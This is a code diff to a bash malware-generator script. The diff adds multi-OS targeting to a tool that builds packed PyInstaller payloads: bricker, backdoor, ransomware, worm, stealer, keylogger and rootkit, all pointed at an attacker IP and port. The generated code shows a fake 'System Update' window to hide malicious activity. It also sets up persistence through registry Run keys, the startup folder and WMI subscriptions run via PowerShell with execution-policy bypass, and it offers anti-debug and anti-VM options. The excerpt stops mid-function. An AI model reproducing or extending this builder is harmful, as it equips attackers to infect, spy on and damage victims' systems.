@@ -19,6 +19,7 @@ VENV_DIR="./fire_venv"
 WORK_DIR="./fire_build"
 FINAL_NAME_WIN="pc.exe"
 FINAL_NAME_LIN="pc"
+FINAL_NAME_MAC="pc_macos"
 LOG_FILE="fire_generator.log"
 MAX_LOG_SIZE=1048576
 CONFIG_FILE=".fire_config"
@@ -98,11 +99,55 @@ CLOUDFLARE_TUNNEL_PORT="8080"
 AUTO_EXECUTION=true  
 FAKE_GUI_ENABLED=true # New: Enables a fake "System Update" window
 
+# Platform detection
+detect_platform() {
+    case "$(uname -s)" in
+        Linux*)     PLATFORM="Linux";;
+        Darwin*)    PLATFORM="macOS";;
+        CYGWIN*|MINGW*|MSYS*) PLATFORM="Windows";;
+        *)          PLATFORM="Unknown";;
+    esac
+    echo "$PLATFORM"
+}
+
+# Cross-platform file size function
+get_file_size() {
+    local file_path="$1"
+    if [ "$(detect_platform)" = "macOS" ]; then
+        stat -f%z "$file_path" 2>/dev/null || echo "0"
+    else
+        stat -c%s "$file_path" 2>/dev/null || echo "0"
+    fi
+}
+
+# Cross-platform directory creation
+ensure_dir() {
+    local dir_path="$1"
+    if [ ! -d "$dir_path" ]; then
+        mkdir -p "$dir_path"
+    fi
+}
+
+# Cross-platform file permissions
+set_executable() {
+    local file_path="$1"
+    chmod +x "$file_path" 2>/dev/null || true
+}
+
+# Cross-platform temp directory
+get_temp_dir() {
+    if [ "$(detect_platform)" = "Windows" ]; then
+        echo "$TEMP/fire_temp_$$"
+    else
+        echo "/tmp/fire_temp_$$"
+    fi
+}
+
 # Logging system
 init_logging() {
     [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
     
-    if [ -f "$LOG_FILE" ] && [ $(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
+    if [ -f "$LOG_FILE" ] && [ $(get_file_size "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
         mv "$LOG_FILE" "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
         gzip "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)" &
     fi
@@ -285,7 +330,7 @@ check_dependencies() {
 setup_cloudflared() {
     log_message "INFO" "Setting up Cloudflare tunnel..."
     
-    mkdir -p "$CLOUDFLARED_DIR"
+    ensure_dir "$CLOUDFLARED_DIR"
     
     local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
     local arch=$(uname -m)
@@ -303,6 +348,7 @@ setup_cloudflared() {
     case "$os" in
         linux) os="linux" ;;
         darwin) os="darwin" ;;
+        windows) os="windows" ;;
         *) os="linux" ;;
     esac
     
@@ -326,7 +372,7 @@ setup_cloudflared() {
             return 1
         fi
         
-        chmod +x "$cloudflared_binary"
+        set_executable "$cloudflared_binary"
         log_message "SUCCESS" "cloudflared downloaded successfully"
     else
         log_message "INFO" "cloudflared already exists"
@@ -411,8 +457,10 @@ stop_cloudflare_tunnel() {
 setup_environment() {
     log_message "INFO" "Setting up environment..."
     
-    mkdir -p "$TEMP_DIR"
-    mkdir -p "$DELIVERY_DIR"
+    # Use cross-platform temp directory
+    TEMP_DIR=$(get_temp_dir)
+    ensure_dir "$TEMP_DIR"
+    ensure_dir "$DELIVERY_DIR"
     
     if [ ! -d "$VENV_DIR" ]; then
         echo -e "${Y}[*] Creating isolated Python environment...${NC}"
@@ -425,9 +473,17 @@ setup_environment() {
         log_message "INFO" "Using existing virtual environment"
     fi
     
-    if ! source "$VENV_DIR/bin/activate"; then
-        log_message "ERROR" "Failed to activate virtual environment"
-        exit 1
+    # Cross-platform virtual environment activation
+    if [ "$(detect_platform)" = "Windows" ]; then
+        if ! source "$VENV_DIR/Scripts/activate"; then
+            log_message "ERROR" "Failed to activate virtual environment"
+            exit 1
+        fi
+    else
+        if ! source "$VENV_DIR/bin/activate"; then
+            log_message "ERROR" "Failed to activate virtual environment"
+            exit 1
+        fi
     fi
     
     echo -e "${Y}[*] Upgrading pip and setuptools...${NC}"
@@ -450,7 +506,7 @@ setup_environment() {
         fi
     done
     
-    mkdir -p "$WORK_DIR"
+    ensure_dir "$WORK_DIR"
     if ! cd "$WORK_DIR"; then
         log_message "ERROR" "Failed to create/access work directory"
         exit 1
@@ -499,7 +555,7 @@ get_configuration() {
     echo "1) Windows"
     echo "2) Linux"
     echo "3) macOS"
-    echo "4) Cross-platform"
+    echo "4) Multi-OS (auto-detect target OS and execute appropriate payload)"
     while true; do
         read -p ">> " os_choice
         case $os_choice in
@@ -517,14 +573,28 @@ get_configuration() {
                 ;;
             3)
                 TARGET_OS="macOS"
-                FINAL_NAME="$FINAL_NAME_LIN"
+                FINAL_NAME="$FINAL_NAME_MAC"
                 log_message "INFO" "Target OS selected: macOS"
                 break
                 ;;
             4)
-                TARGET_OS="Cross-platform"
-                FINAL_NAME="$FINAL_NAME_LIN"
-                log_message "INFO" "Target OS selected: Cross-platform"
+                TARGET_OS="Multi-OS"
+                # Set appropriate filename based on current platform
+                case "$(detect_platform)" in
+                    "Windows")
+                        FINAL_NAME="$FINAL_NAME_WIN"
+                        ;;
+                    "Linux")
+                        FINAL_NAME="$FINAL_NAME_LIN"
+                        ;;
+                    "macOS")
+                        FINAL_NAME="$FINAL_NAME_MAC"
+                        ;;
+                    *)
+                        FINAL_NAME="$FINAL_NAME_LIN"
+                        ;;
+                esac
+                log_message "INFO" "Target OS selected: Multi-OS (auto-detect on target)"
                 break
                 ;;
             *)
@@ -577,17 +647,17 @@ get_configuration() {
         
         # Enhanced persistence method selection based on OS
         echo -e "\n${B}SELECT PERSISTENCE METHOD:${NC}"
-        if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+        if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
             echo "1) Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)"
             echo "2) Windows Startup Folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp)"
             echo "3) WMI Event Subscription"
             echo "4) Scheduled Task"
-        elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+        elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
             echo "5) Cron Job"
             echo "6) Systemd Service (/lib/systemd/system/)"
             echo "7) Init.d Script"
             echo "8) Profile Modification"
-        elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+        elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
             echo "9) LaunchAgent (/Library/LaunchAgents/)"
             echo "10) LaunchDaemon (/Library/LaunchDaemons/)"
             echo "11) Login Item"
@@ -596,7 +666,7 @@ get_configuration() {
         
         while true; do
             read -p ">> " pers_choice
-            if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
                     1) PERSISTENCE_METHOD="registry"; break ;;
                     2) PERSISTENCE_METHOD="windows_startup"; break ;;
@@ -604,7 +674,7 @@ get_configuration() {
                     4) PERSISTENCE_METHOD="scheduled_task"; break ;;
                     *) echo -e "${R}[!] Invalid choice. Please enter 1-4.${NC}" ;;
                 esac
-            elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
                     5) PERSISTENCE_METHOD="cron"; break ;;
                     6) PERSISTENCE_METHOD="linux_systemd"; break ;;
@@ -612,7 +682,7 @@ get_configuration() {
                     8) PERSISTENCE_METHOD="profile_mod"; break ;;
                     *) echo -e "${R}[!] Invalid choice. Please enter 5-8.${NC}" ;;
                 esac
-            elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Multi-OS" ]; then
                 case $pers_choice in
                     9) PERSISTENCE_METHOD="macos_launchagent"; break ;;
                     10) PERSISTENCE_METHOD="macos_launchdaemon"; break ;;
@@ -816,7 +886,7 @@ validate_config() {
     ! validate_ip "$ATTACKER_IP" && errors+=("Invalid attacker IP: $ATTACKER_IP")
     ! validate_port "$ATTACKER_PORT" && errors+=("Invalid attacker port: $ATTACKER_PORT")
     
-    [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Cross-platform" ] && errors+=("Invalid target OS: $TARGET_OS")
+    [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Multi-OS" ] && errors+=("Invalid target OS: $TARGET_OS")
     
     [[ ! "$PAYLOAD_TYPE" =~ ^[1-9]$ ]] && errors+=("Invalid payload type: $PAYLOAD_TYPE")
     
@@ -849,81 +919,83 @@ generate_payload() {
     
     local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
     
-    # Handle cross-platform payload generation
-    if [ "$target_os" == "Cross-platform" ]; then
-        echo -e "${Y}[*] Generating cross-platform payload...${NC}"
+    # Handle multi-OS payload generation
+    if [ "$target_os" == "Multi-OS" ]; then
+        echo -e "${Y}[*] Generating multi-OS payload with auto-detection...${NC}"
         
-        # Create a directory for cross-platform builds
-        mkdir -p "../cross_platform_builds"
+        # Create a directory for multi-OS builds
+        ensure_dir "../multi_os_builds"
         
-        # Generate for each platform
-        local platforms=("Windows" "Linux" "macOS")
-        local platform_names=("pc.exe" "pc_linux" "pc_macos")
-        local success_count=0
+        # Generate the multi-OS payload
+        case $type in
+            1) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            2) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            3) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            4) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            5) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            6) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            7) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            8) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            9) create_multi_os_payload "$attacker_ip" "$attacker_port" "$encryption_key" ;;
+            *)
+                echo -e "${R}[!] Invalid payload type selected.${NC}"
+                log_message "ERROR" "Invalid payload type: $type"
+                return 1
+                ;;
+        esac
         
-        for i in "${!platforms[@]}"; do
-            local platform="${platforms[$i]}"
-            local platform_name="${platform_names[$i]}"
-            
-            echo -e "${Y}[*] Building for $platform...${NC}"
-            
-            # Create platform-specific payload
-            case $type in
-                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
-                *)
-                    echo -e "${R}[!] Invalid payload type selected.${NC}"
-                    log_message "ERROR" "Invalid payload type: $type"
-                    return 1
-                    ;;
-            esac
-            
-            [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
-            [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
-            [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
-            
-            # Compile for the specific platform
-            local pyinstaller_args="--onefile --name=$platform_name"
-            
-            # FIX: Always use --noconsole
-            pyinstaller_args="$pyinstaller_args --noconsole"
-            
-            # Only add --windowed if not on Linux (Linux GUI support varies)
-            if [ "$platform" != "Linux" ]; then
-                 pyinstaller_args="$pyinstaller_args --windowed"
+        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
+        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
+        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
+        
+        # Compile for the current platform
+        local current_platform=$(detect_platform)
+        local pyinstaller_args="--onefile --name=$final_name"
+        
+        # Use platform-specific compilation options
+        if [ "$current_platform" = "Windows" ]; then
+            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
+        elif [ "$current_platform" = "Linux" ]; then
+            # For Linux, check if GUI is enabled
+            if [ "$FAKE_GUI_ENABLED" = true ]; then
+                # Check if we have X11 display available
+                if [ -n "$DISPLAY" ]; then
+                    pyinstaller_args="$pyinstaller_args --windowed"
+                else
+                    # No display available, use console mode
+                    pyinstaller_args="$pyinstaller_args --noconsole"
+                fi
+            else
+                pyinstaller_args="$pyinstaller_args --noconsole"
             fi
-            
-            pyinstaller_args="$pyinstaller_args --strip --clean"
-            
-            [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
-                1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
-                2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
-                3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
-            esac
-            
-            if pyinstaller $pyinstaller_args payload.py; then
-                if [ -f "dist/$platform_name" ]; then
-                    local file_size=$(stat -f%z "dist/$platform_name" 2>/dev/null || stat -c%s "dist/$platform_name")
-                    local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
-                    local file_hash=$(sha256sum "dist/$platform_name" | cut -d' ' -f1)
-                    
-                    echo -e "${G}[+] Success! $platform payload created as 'dist/$platform_name' (${size_mb} MB).${NC}"
-                    
-                    # Move to cross-platform directory
-                    mv "dist/$platform_name" "../cross_platform_builds/"
-                    
-                    # Create metadata for this platform
-                    local metadata_file="../cross_platform_builds/${platform_name}.meta"
-                    cat > "$metadata_file" << EOF
+        elif [ "$current_platform" = "macOS" ]; then
+            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
+        fi
+        
+        pyinstaller_args="$pyinstaller_args --strip --clean"
+        
+        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
+            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
+            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
+            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
+        esac
+        
+        if pyinstaller $pyinstaller_args payload.py; then
+            if [ -f "dist/$final_name" ]; then
+                local file_size=$(get_file_size "dist/$final_name")
+                local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
+                local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
+                
+                echo -e "${G}[+] Success! Multi-OS payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
+                
+                # Move to multi-OS directory
+                mv "dist/$final_name" "../multi_os_builds/"
+                
+                # Create metadata for the payload
+                local metadata_file="../multi_os_builds/${final_name}.meta"
+                cat > "$metadata_file" << EOF
 Payload Type: $type
-Target OS: $platform
+Target OS: Multi-OS (Auto-detect)
 Build ID: $BUILD_ID
 Timestamp: $BUILD_TIMESTAMP
 File Size: $file_size bytes
@@ -941,131 +1013,62 @@ Runtime Decryption: $RUNTIME_DECRYPTION
 Auto-Execution Enabled: $AUTO_EXECUTION
 Fake GUI Enabled: $FAKE_GUI_ENABLED
 Delivery Method: $DELIVERY_METHOD
+
+Features:
+- Auto-detects target OS on execution
+- Executes appropriate payload code for detected OS
+- Cross-platform compatibility
 EOF
-                    
-                    success_count=$((success_count + 1))
-                    log_message "SUCCESS" "Successfully created $platform executable: $platform_name (${size_mb} MB, SHA256: $file_hash)"
-                fi
-            else
-                echo -e "${R}[!] Failed to create $platform executable.${NC}"
-                log_message "ERROR" "Failed to create $platform executable"
-            fi
-        done
-        
-        # Create a master launcher script for cross-platform deployment
-        cat > "../cross_platform_builds/launcher.sh" << 'EOF'
-#!/bin/bash
-# Cross-platform launcher script
-# Detects the OS and runs the appropriate payload
-
-# Get the directory where this script is located
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-
-# Detect the operating system
-OS="unknown"
-if [[ "$OSTYPE" == "linux-gnu"* ]]; then
-    OS="linux"
-elif [[ "$OSTYPE" == "darwin"* ]]; then
-    OS="macos"
-elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
-    OS="windows"
-fi
-
-# Execute the appropriate payload based on the detected OS
-case $OS in
-    "linux")
-        if [ -f "$SCRIPT_DIR/pc_linux" ]; then
-            chmod +x "$SCRIPT_DIR/pc_linux"
-            "$SCRIPT_DIR/pc_linux" "$@"
-        else
-            echo "Linux payload not found"
-            exit 1
-        fi
-        ;;
-    "macos")
-        if [ -f "$SCRIPT_DIR/pc_macos" ]; then
-            chmod +x "$SCRIPT_DIR/pc_macos"
-            "$SCRIPT_DIR/pc_macos" "$@"
-        else
-            echo "macOS payload not found"
-            exit 1
-        fi
-        ;;
-    "windows")
-        if [ -f "$SCRIPT_DIR/pc.exe" ]; then
-            "$SCRIPT_DIR/pc.exe" "$@"
-        else
-            echo "Windows payload not found"
-            exit 1
-        fi
-        ;;
-    *)
-        echo "Unsupported operating system: $OSTYPE"
-        exit 1
-        ;;
-esac
-EOF
-        
-        chmod +x "../cross_platform_builds/launcher.sh"
-        
-        # Create a Windows batch file launcher
-        cat > "../cross_platform_builds/launcher.bat" << 'EOF'
-@echo off
-REM Cross-platform launcher for Windows
-REM Detects if running on Windows and runs the appropriate payload
-
-REM Get the directory where this script is located
-set SCRIPT_DIR=%~dp0
-
-REM Run the Windows executable
-if exist "%SCRIPT_DIR%pc.exe" (
-    start "" "%SCRIPT_DIR%pc.exe" %*
-) else (
-    echo Windows payload not found
-    pause
-    exit /b 1
-)
-EOF
-        
-        # Create a summary file
-        cat > "../cross_platform_builds/README.txt" << EOF
-CROSS-PLATFORM PAYLOAD BUILD SUMMARY
+                
+                log_message "SUCCESS" "Successfully created multi-OS executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
+                
+                # Create a summary file
+                cat > "../multi_os_builds/README.txt" << EOF
+MULTI-OS PAYLOAD BUILD SUMMARY
 ====================================
 Build ID: $BUILD_ID
 Timestamp: $BUILD_TIMESTAMP
 Payload Type: $type
-Successfully Built: $success_count/3 platforms
 Auto-Execution Enabled: $AUTO_EXECUTION
 Fake GUI Enabled: $FAKE_GUI_ENABLED
 
 Files:
-- launcher.sh: Unix/Linux/macOS launcher script
-- launcher.bat: Windows batch launcher
-- pc.exe: Windows executable
-- pc_linux: Linux executable
-- pc_macos: macOS executable
+- $final_name: Multi-OS executable with auto-detection
 
 Usage:
-1. On Unix/Linux/macOS: ./launcher.sh
-2. On Windows: launcher.bat
-
-Each platform-specific executable can also be run directly.
+Run the executable on any supported platform (Windows, Linux, macOS).
+The payload will automatically detect the operating system and execute
+the appropriate code for that platform.
 
 Auto-Execution:
-If enabled, payload will automatically execute upon installation.
+If enabled, payload will automatically execute upon installation using
+the appropriate persistence method for the detected OS.
 
 Fake GUI:
 If enabled, payload will display a fake "System Update" window 
 to mask malicious activity and ensure immediate user interaction.
+
+Supported Platforms:
+- Windows (Registry, Startup Folder, WMI, Scheduled Tasks)
+- Linux (Cron, Systemd, Init.d, Profile)
+- macOS (LaunchAgent, LaunchDaemon, Login Items, Cron)
 EOF
-        
-        echo -e "${G}[+] Cross-platform build complete!${NC}"
-        echo -e "${G}[+] Successfully built $success_count/3 platforms.${NC}"
-        echo -e "${G}[+] All files are in the 'cross_platform_builds' directory.${NC}"
-        echo -e "${G}[+] Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
-        
-        log_message "SUCCESS" "Cross-platform build completed: $success_count/3 platforms"
-        return 0
+                
+                echo -e "${G}[+] Multi-OS build complete!${NC}"
+                echo -e "${G}[+] All files are in the 'multi_os_builds' directory.${NC}"
+                
+                log_message "SUCCESS" "Multi-OS build completed"
+                return 0
+            else
+                echo -e "${R}[!] Failed to create multi-OS executable.${NC}"
+                log_message "ERROR" "Failed to create multi-OS executable"
+                return 1
+            fi
+        else
+            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
+            log_message "ERROR" "PyInstaller compilation failed"
+            return 1
+        fi
     else
         # Single platform payload generation (original code)
         case $type in
@@ -1093,12 +1096,24 @@ EOF
         
         local pyinstaller_args="--onefile --name=$final_name"
         
-        # FIX: Always use --noconsole
-        pyinstaller_args="$pyinstaller_args --noconsole"
-        
-        # Add windowed for non-Linux
-        if [ "$target_os" != "Linux" ]; then
-            pyinstaller_args="$pyinstaller_args --windowed"
+        # Use platform-specific compilation options
+        if [ "$target_os" = "Windows" ]; then
+            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
+        elif [ "$target_os" = "Linux" ]; then
+            # For Linux, check if GUI is enabled
+            if [ "$FAKE_GUI_ENABLED" = true ]; then
+                # Check if we have X11 display available
+                if [ -n "$DISPLAY" ]; then
+                    pyinstaller_args="$pyinstaller_args --windowed"
+                else
+                    # No display available, use console mode
+                    pyinstaller_args="$pyinstaller_args --noconsole"
+                fi
+            else
+                pyinstaller_args="$pyinstaller_args --noconsole"
+            fi
+        elif [ "$target_os" = "macOS" ]; then
+            pyinstaller_args="$pyinstaller_args --noconsole --windowed"
         fi
         
         pyinstaller_args="$pyinstaller_args --strip --clean"
@@ -1116,7 +1131,7 @@ EOF
         fi
 
         if [ -f "dist/$final_name" ]; then
-            local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
+            local file_size=$(get_file_size "dist/$final_name")
             local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
             local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
             
@@ -1165,43 +1180,503 @@ generate_fake_gui_code() {
 import threading
 import time
 import sys
+import os
+import platform
 
 def run_fake_gui():
     """Shows a fake 'System Update' window while malware runs in background"""
     try:
-        import tkinter as tk
-        from tkinter import messagebox
+        # Platform-specific GUI implementation
+        system = platform.system()
         
-        root = tk.Tk()
-        root.title("System Update")
-        
-        # Center window
-        screen_width = root.winfo_screenwidth()
-        screen_height = root.winfo_screenheight()
-        x = (screen_width / 2) - (300 / 2)
-        y = (screen_height / 2) - (150 / 2)
-        root.geometry(f'300x150+{int(x)}+{int(y)}')
-        
-        # Prevent resizing
-        root.resizable(False, False)
-        
-        # Create widgets
-        label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
-        label.pack(pady=20)
-        
-        status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
-        status.pack(pady=5)
-        
-        # Schedule window to close after 3 seconds
-        root.after(3000, root.destroy)
-        
-        # Start GUI mainloop
-        root.mainloop()
-        
+        if system == "Windows":
+            import tkinter as tk
+            from tkinter import messagebox
+            
+            root = tk.Tk()
+            root.title("System Update")
+            
+            # Center window
+            screen_width = root.winfo_screenwidth()
+            screen_height = root.winfo_screenheight()
+            x = (screen_width / 2) - (300 / 2)
+            y = (screen_height / 2) - (150 / 2)
+            root.geometry(f'300x150+{int(x)}+{int(y)}')
+            
+            # Prevent resizing
+            root.resizable(False, False)
+            
+            # Create widgets
+            label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
+            label.pack(pady=20)
+            
+            status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
+            status.pack(pady=5)
+            
+            # Schedule window to close after 3 seconds
+            root.after(3000, root.destroy)
+            
+            # Start GUI mainloop
+            root.mainloop()
+            
+        elif system == "Linux":
+            # Check if X11 display is available
+            if os.environ.get('DISPLAY'):
+                try:
+                    import tkinter as tk
+                    from tkinter import messagebox
+                    
+                    root = tk.Tk()
+                    root.title("System Update")
+                    
+                    # Center window
+                    screen_width = root.winfo_screenwidth()
+                    screen_height = root.winfo_screenheight()
+                    x = (screen_width / 2) - (300 / 2)
+                    y = (screen_height / 2) - (150 / 2)
+                    root.geometry(f'300x150+{int(x)}+{int(y)}')
+                    
+                    # Prevent resizing
+                    root.resizable(False, False)
+                    
+                    # Create widgets
+                    label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
+                    label.pack(pady=20)
+                    
+                    status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
+                    status.pack(pady=5)
+                    
+                    # Schedule window to close after 3 seconds
+                    root.after(3000, root.destroy)
+                    
+                    # Start GUI mainloop
+                    root.mainloop()
+                except Exception:
+                    # If GUI fails, use a terminal-based notification
+                    print("\n" + "="*50)
+                    print("SYSTEM UPDATE IN PROGRESS")
+                    print("Please wait while we configure your system...")
+                    print("="*50 + "\n")
+                    time.sleep(3)
+            else:
+                # No display available, use terminal notification
+                print("\n" + "="*50)
+                print("SYSTEM UPDATE IN PROGRESS")
+                print("Please wait while we configure your system...")
+                print("="*50 + "\n")
+                time.sleep(3)
+                
+        elif system == "Darwin":  # macOS
+            try:
+                import tkinter as tk
+                from tkinter import messagebox
+                
+                root = tk.Tk()
+                root.title("System Update")
+                
+                # Center window
+                screen_width = root.winfo_screenwidth()
+                screen_height = root.winfo_screenheight()
+                x = (screen_width / 2) - (300 / 2)
+                y = (screen_height / 2) - (150 / 2)
+                root.geometry(f'300x150+{int(x)}+{int(y)}')
+                
+                # Prevent resizing
+                root.resizable(False, False)
+                
+                # Create widgets
+                label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
+                label.pack(pady=20)
+                
+                status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
+                status.pack(pady=5)
+                
+                # Schedule window to close after 3 seconds
+                root.after(3000, root.destroy)
+                
+                # Start GUI mainloop
+                root.mainloop()
+            except Exception:
+                # If GUI fails, use a terminal-based notification
+                print("\n" + "="*50)
+                print("SYSTEM UPDATE IN PROGRESS")
+                print("Please wait while we configure your system...")
+                print("="*50 + "\n")
+                time.sleep(3)
+        else:
+            # Unknown system, use terminal notification
+            print("\n" + "="*50)
+            print("SYSTEM UPDATE IN PROGRESS")
+            print("Please wait while we configure your system...")
+            print("="*50 + "\n")
+            time.sleep(3)
+            
     except Exception:
-        # If GUI fails (no X server), just pass
+        # If GUI fails, just pass
         pass
 GUI_CODE
+}
+
+# Multi-OS payload creation function
+create_multi_os_payload() {
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    
+    cat > payload.py << EOF
+#!/usr/bin/env python3
+import os
+import sys
+import time
+import platform
+import subprocess
+import threading
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+ATTACKER_IP = "$attacker_ip"
+ATTACKER_PORT = "$attacker_port"
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
+
+def detect_os():
+    """Detect the operating system"""
+    system = platform.system()
+    
+    if system == "Windows":
+        return "Windows"
+    elif system == "Linux":
+        return "Linux"
+    elif system == "Darwin":
+        return "macOS"
+    else:
+        return "Unknown"
+
+def setup_persistence_windows():
+    """Set up persistence on Windows"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        # Get current executable path
+        exe_path = os.path.abspath(sys.argv[0])
+        
+        # Windows persistence based on selected method
+        if PERSISTENCE_METHOD == "registry":
+            import winreg
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif PERSISTENCE_METHOD == "windows_startup":
+            # Copy to Windows Startup folder
+            startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+            if not os.path.exists(startup_folder):
+                os.makedirs(startup_folder)
+            startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+            if not os.path.exists(startup_exe):
+                import shutil
+                shutil.copy2(exe_path, startup_exe)
+                
+        elif PERSISTENCE_METHOD == "wmi_subscription":
+            # Create WMI event subscription
+            wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+            # Execute PowerShell script
+            subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+            
